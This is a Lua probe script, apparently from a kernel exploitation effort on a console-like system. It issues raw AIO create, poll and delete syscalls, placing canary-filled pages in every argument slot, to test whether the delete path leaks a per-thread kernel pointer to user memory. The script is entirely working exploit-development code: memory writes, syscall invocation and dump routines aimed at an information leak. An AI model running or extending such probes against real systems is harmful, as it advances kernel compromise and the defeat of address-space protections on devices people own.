-- CRASH_CLASS: MODERATE
-- PROBE 566g: does the aio delete write a record array anywhere?
--
-- Context: the 13.60 delete body allocates a count*0x18 record array when the
-- aio state gate passes, fills each entry with the id, [C] (a per-thread
-- pointer) and a mangled [C+0x10], then calls an uncaptured helper and frees
-- the array. If the helper copies the records to user memory, the record
-- carries a kernel pointer.
-- Cheap canaries only: 566g v1 wedged the Lua thread filling 7 x 0x1000 pages.

print("=== PROBE 566g: AIO DELETE RECORD ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wd(addr, value) memory.write_dword(addr, value) end
local function wq(addr, value) memory.write_qword(addr, value) end
local function rd(addr) return to_num(memory.read_dword(addr)) end

local function page(n)
    local p = to_num(memory.alloc(n))
    for i = 0, n / 4 - 1 do wd(p + i * 4, 0xA5A5A5A5) end
    return p
end
local reqs = page(0x100)
local data = page(0x100)
local status = page(0x200)
local ids = page(0x40)
local states = page(0x40)
local extra4 = page(0x100)
local extra5 = page(0x100)
local RES = page(0x40)
print(string.format("[0] reqs=%08X data=%08X status=%08X ids=%08X states=%08X a4=%08X a5=%08X",
    reqs, data, status, ids, states, extra4, extra5))

local path = page(0x20)
wd(path, 0x7665642F) wd(path + 4, 0x6172752F) wd(path + 8, 0x6D6F646E) wd(path + 0xC, 0)
local fd = sgn(sc(5)(U(path), Z, Z, Z, Z, Z))
print(string.format("[A] fd=%d", fd))

local function fill_req(base, off, len, buf, res, fdno)
    wq(base + 0x00, U(off))
    wq(base + 0x08, U(len))
    wq(base + 0x10, U(buf))
    wq(base + 0x18, U(res))
    wd(base + 0x20, fdno)
    wd(base + 0x24, 0)
end

-- two entries in one block-mode request: flags 0x1001, count 2
fill_req(reqs, 0, 16, data, RES, fd)
fill_req(reqs + 0x28, 0, 16, data + 0x40, RES + 8, fd)
print(string.format("[B] create ret=%s id=0x%X", tostring(sgn(sc(669)(U(0x1001), U(reqs), U(2), U(1), U(ids), Z))), rd(ids)))
local id0 = rd(ids)
wd(ids, id0)
wd(ids + 4, id0 + 0x10000)
print(string.format("[B] ids=0x%X 0x%X", rd(ids), rd(ids + 4)))
print(string.format("[B] poll ret=%s s0=0x%X s1=0x%X res0=0x%X res1=0x%X",
    tostring(sgn(sc(664)(U(ids), U(2), U(states), Z, Z, Z))), rd(states), rd(states + 4), rd(RES), rd(RES + 8)))
print(string.format("[B] data=%08X %08X", rd(data), rd(data + 0x40)))
print(string.format("[B] poll2 ret=%s s0=0x%X s1=0x%X",
    tostring(sgn(sc(664)(U(ids), U(2), U(states), Z, Z, Z))), rd(states), rd(states + 4)))

-- delete both with canary pages in every argument slot
print("[C] delete count=2")
local ok, ret = pcall(function()
    return sc(662)(U(ids), U(2), U(status), U(extra4), U(extra5), Z)
end)
print(string.format("  ret=%s", ok and tostring(sgn(ret)) or "PCALL-FAIL"))
local function dump(tag, p, n)
    local s = ""
    for off = 0, n - 4, 4 do
        local v = rd(p + off)
        if v ~= 0xA5A5A5A5 and v ~= 0xFFFFFFFF then s = s .. string.format(" %03X=%08X", off, v) end
    end
    if s == "" then s = " (untouched)" end
    print("  " .. tag .. ":" .. s)
end
dump("status", status, 0x100)
dump("arg4", extra4, 0x100)
dump("arg5", extra5, 0x100)
dump("ids", ids, 0x20)

print("=== 566g DONE ===")
